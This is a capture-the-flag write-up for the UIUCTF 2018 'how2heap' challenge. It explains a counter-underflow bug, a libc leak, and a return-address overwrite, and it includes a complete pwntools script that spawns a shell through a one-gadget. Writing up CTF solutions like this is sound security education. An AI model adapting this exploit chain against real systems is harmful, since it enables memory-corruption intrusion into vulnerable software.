---
title: "UIUCTF 2018 - how2heap (300pt)"
description: "\"heap\" exploitation"
date: 2018-04-08
tags: ["exploit"]
---

# how2heap (300pt)

**`Exploitation`**

**Description:** intro to heap exploitation

nc challenges1.uiuc.tf 38910

**Files:**

* [how2heap](/code/2018/UIUCTF/how2heap/how2heap)
* [libc-2.26.so](/code/2018/UIUCTF/how2heap/libc-2.26.so)

# Solution

The application allows you to store the name and age of GW2 characters. These characters are stored in an array-backed binary max heap on the stack in the following manner:

```
       | 8 bytes || 8 bytes |
       ----------------------
base > [ counter ]
       [ age0    ][ name0   ]
       [ age1    ][ name1   ]
       [ age2    ][ name2   ]
       [ age3    ][ name3   ]
       ...
       [ age15   ][ name15  ]
       ...
       [ return  ]
```

In order to keep track of where to add new characters, there is a counter variable that initially starts at zero. The address of the new character is determined by: `base + (counter + 1) << 4`. However, before creating the character, the subroutine checks if `counter > 0xe`. If this is true, it simply prints, "Too many characters" and returns.

During my initial testing, I realized that if you created two characters, you could actually call delete three times. This is because when you call delete, it only clears the name region of the character, not the age. This has the effect of setting `counter` to -1.

Once you do this, the next character will be written directly on top of the counter variable. However, due to the check as stated above, you can only achieve negative writes for counter values less than or equal to `0xe`.

# Libc leak

In order to leak libc, we need to leak some stack data. When we call delete, it deletes the character at index zero and prints out the name. Additionally, there is no check on the value of the counter variable when we call delete.

Since this is a binary heap, the delete algorithm simply takes the furthest leaf node and overwrites the root element. Then it calls `sink` on the root element to maintain the heap invariants. If this is not familiar to you see the following wikipedia article: [https://en.wikipedia.org/wiki/Binary_heap#Extract](https://en.wikipedia.org/wiki/Binary_heap#Extract).

Therefore, we can set the counter to point to a region of stack memory that contains a libc address and call delete twice so that the libc address is printed. It is straightforward from there to calculate the libc base address and a magic gadget address with the provided libc.

# Saved return address overwrite

We can not simply set the count variable to the offset of the saved return address since we wouldn't be able to create a new character. The solution is to exploit the way the address is calculated. When we provide an age (to overwrite the count variable), it is read via `scanf("%ld", &age)`. Therefore, we can provide negative numbers.

When I first encountered this, it didn't seem like much of a help since negative numbers would mean a negative offset right? Then I realized that due to the shifting, we could set only the MSB of the count variable and it would be ignored. For instance, setting `count` to `0xf` would effectively overwrite the return address if the check was not in place. However, by setting `count` to `0x800000000000000f` we can bypass the check (since this is a negative number) and we still point to the same address since the high bits are shifted away.

# Script
[view raw](/code/2018/UIUCTF/how2heap/solveHow2heap.py)

```py
# by hgarrereyn

from pwn import *
import binascii

s = remote('challenges1.uiuc.tf', 38910)

s.recvuntil('Choice: ')

def order():
    s.sendline('0')
    s.recvuntil('Choice:')

def count():
    s.sendline('1')
    s.recvuntil('Choice:')

def make(name, age):
    s.sendline('2')
    s.recvuntil('? ')
    s.sendline(name)
    s.recvuntil('? ')
    s.sendline(str(age))
    s.recvuntil('Choice: ')

def delete():
    s.sendline('3')
    return s.recvuntil('Choice: ')

def parse_addr(r):
    leak = r.split('\n')[1].split(' ')[0][:-1]
    addr = int(binascii.hexlify(leak[::-1]), 16)
    return addr

# setup
make('a',1)
make('b',1)
delete()
delete()
delete()
order()

# the age of the next make will overwrite the count variable

# leak libc
make('f',26)
delete()

libc_base = parse_addr(delete()) - 4131819 # specific to the provided libc
log.info('Libc base: ' + hex(libc_base))

# reset the pointer
count()
make('a',1)
make('b',1)
delete()
delete()
delete()

# next age will overwrite count variable again
make('a', -9223372036854775792)

# magic gadget
make(p64(libc_base + 0xfccde), 1)

# return, jump to magic gadget
s.sendline('9')

s.interactive()
```